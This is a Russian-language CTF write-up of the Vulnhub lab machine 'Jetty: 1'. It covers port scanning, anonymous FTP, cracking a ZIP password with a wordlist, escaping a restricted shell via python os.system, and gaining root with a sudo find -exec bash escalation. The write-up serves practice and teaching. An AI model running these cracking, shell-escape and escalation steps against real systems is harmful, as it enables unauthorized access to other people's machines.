# Jetty: 1
## Vulnhub machine

- Название: Jetty: 1  
- OS: Linux
- Ресурс: Vulnhub
- Сложность: Easy to Intermediate
- Дата релиза: 9.12.20
- Оригинальное описание: 
>The company Aquarium Life S.L. has contacted you to perform a pentest against one of their machines. They suspect that one of their employees has been committing fraud selling fake tickets. They want you to break into his computer, escalate privileges and search for any evidences that proves this behaviour.
ZIP Password: EsSabad0!
Extra information:
    The suspicious username is Squiddie.
    He was in charge of the ticket selling for the Aquarium.
    Ethernet settings set to NAT with DHCP enabled.
    You should find the IP in your VLAN.
The idea of the machine it is not just to gain root privileges but obtaining all the evidences to prove that the user was commiting fraud.
Difficulty: I would say the machine is Medium regarding gaining root privileges. If we consider all the steps to obtain the evidences, Hard.


## Write-up

```html
┌──(user@kali)-[~]
└─$ nmap -sV 192.168.0.188                                                130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 01:33 EST
Nmap scan report for jetty (192.168.0.188)
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds
```

```html 
┌──(user@kali)-[~]
└─$ gobuster dir --url http://192.168.0.188/ -w /usr/share/wordlists/dirb/common.txt              
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.0.188/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/17 01:38:46 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2021/02/17 01:38:47 Finished
===============================================================
```

>Интересные каталоги, которые недоступны:

```html
robots.txt:

User-agent: *
Disallow: /dir/
Disallow: /passwords/
Disallow: /facebook_photos
Disallow: /admin/secret
```

>И ssh на нестандартном порте:

```html
http://192.168.0.188:65507/

SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.1
Protocol mismatch
```

>Сканируем 21 порт и выясняем, что разрешен анонимный логин:

```html
┌──(user@kali)-[~]
└─$ nmap -sV -sC 192.168.0.188 -p 21   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 02:18 EST
Nmap scan report for jetty (192.168.0.188)
Host is up (0.00053s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 ftp      ftp           306 Oct 06  2018 README.txt [NSE: writeable]
|_-rwxrwxrwx    1 ftp      ftp           226 Oct 06  2018 sshpass.zip [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.0.181
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 2048000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
```

>Входим как anonymous:

```html
┌──(root💀kali)-[/home/user]
└─# ftp 192.168.0.188
Connected to 192.168.0.188.
220 (vsFTPd 3.0.3)
Name (192.168.0.188:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 ftp      ftp           306 Oct 06  2018 README.txt
-rwxrwxrwx    1 ftp      ftp           226 Oct 06  2018 sshpass.zip
226 Directory send OK.
ftp> get README.txt
local: README.txt remote: README.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for README.txt (306 bytes).
226 Transfer complete.
306 bytes received in 0.00 secs (142.7750 kB/s)
ftp> get sshpass.zip
local: sshpass.zip remote: sshpass.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for sshpass.zip (226 bytes).
226 Transfer complete.
226 bytes received in 0.00 secs (82.2905 kB/s)
```

>Скачиваем 2 файла:

```html
Hi Henry, here you have your ssh's password. As you can see the file is encrypted with the default company's password. 
Please, once you have read this file, run the following command on your computer to close the FTP server on your side. 
IT IS VERY IMPORTANT!! CMD: service ftp stop. 

Regards, Michael.
```

>А архив брутим:

```html 
┌──(user@kali)-[~]
└─$ fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt sshpass.zip
found file "sshpass.txt", (size cp/uc	38/	26, flags 9, chk 45e9)
checking pw budayday

PASSWORD FOUND!!!!: pw == seahorse!
```

>Получаем пароль и заходим по ssh (имя юзера указано в описании):

```html
┌──(user@kali)-[~]
└─$ ssh squiddie@192.168.0.188 -p 65507                                  130 ⨯
squiddie@192.168.0.188's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

118 packages can be updated.
0 updates are security updates.

New release '20.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

You are in a limited shell.
Type '?' or 'help' to get the list of allowed commands
squiddie:~$ ls
Desktop    Downloads         Music     Public     Videos
Documents  examples.desktop  Pictures  Templates
```

>При попытке использовать стандартные команды, из сессии выкидывает:

```html
squiddie:~$ find / -user root -perm /4000 2>/dev/null
*** forbidden command -> "find"
*** You have 1 warning(s) left, before getting kicked out.
This incident has been reported.


squiddie:~/Desktop$ cat user.txt
*** forbidden command -> "cat"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
squiddie:~/Desktop$ sudo -l
*** forbidden sudo command -> "sudo -l"
*** Kicked out
Connection to 192.168.0.188 closed.
```

>Но с помощью python можно добиться выполнения нужных команд:

```html
squiddie:~$ python
Python 2.7.15rc1 (default, Apr 15 2018, 21:51:34) 
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>> import os
>> os.system("sudo -l")
Matching Defaults entries for squiddie on jetty:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User squiddie may run the following commands on jetty:
    (ALL) NOPASSWD: /usr/bin/find
```

>Получаем первый флаг:

```html
squiddie:~/Desktop$ ls
To_Michael.txt  user.txt
squiddie:~/Desktop$ python
Python 2.7.15rc1 (default, Apr 15 2018, 21:51:34) 
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system("cat user.txt")
dd69f649f3e5159ddd10b83b56b2dda2
```

>Что-то пока непонятное:

```html
>>>> os.system("cd //;cd var/www/html;cat recoverpassword.txt")
Backup password:

'&%$#"!~}|{zyxwvut210/.-,+k)(!Efedcba`_^]\[ZYXWVUTpohmlkjihg`&GFEDCBA@?>=<;:
9876543210/.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWmrkponmlkdc
b(`_dc\"`BX|?>Z<RWVUNSRKoONGLKDh+*)('&BA:?>=<;:92Vw/43,10)Mnmlkjihgfedcba`_^
]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9UTSRQ3ONMLKJCg*)('&%$#"!~}|{zyxwvutsrq/
(-,+*)('&}|B"b~}v{ts9wputsrqj0QPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$
#"!~}|{zyxwvutsr0/.-,+*)(!~%|Bcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876
543210/.-,+*)('&B$:?>=<;:3270Tu-,+O/.n,%Ijihgfedcba`_^]\[ZYXWVUTSonmlkMibgf_
^$EaZ_^]VUy<XWPOs6543210/.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[Z
YXWVUTSRQPONjihgfedcb[ZBX|\UZYRv9876543210/.-,+*)('&B$@?>=<5:381Uvutsrqpo-,+
k)"'&%|{Aba`_^]yxwYutsrqpi/PONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#"!~
}|{zyxwvutsrqponmlkjihgfedcba`_{]sxwvutslkji/PONMLKaf_^]ba`_^W{[ZYXWPOsMRQJI
mGLKJIHG@dDCB;:9]~6;:92Vwvutsrqponmlkjihgfe#"!~}|{zyxq7utsrTpong-NMLKJIHGFED
CBA@?>=<;:9876543210/.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]sxwvuts
rqjihg-,w
```

>( ͡° ͜ʖ ͡°)

```html
>>> os.system("cd //;cd /home/microsystems;cd Desktop;cat root.txt")
Try Harder!
```

>Эскалируемся так же с помощью python и берем рутовый флаг:

```html
>>> os.system("sudo find . -exec /bin/bash \; -quit")
root@jetty:~/Desktop# id
uid=0(root) gid=0(root) groups=0(root)

root@jetty://root/Desktop# ls
note.txt  proof.txt
root@jetty://root/Desktop# cat note.txt 
Say to Mary that I want to go on vacation on 2 weeks.
root@jetty://root/Desktop# cat proof.txt 
136d05d01c8af5d3e3520d2c270f91f1
```
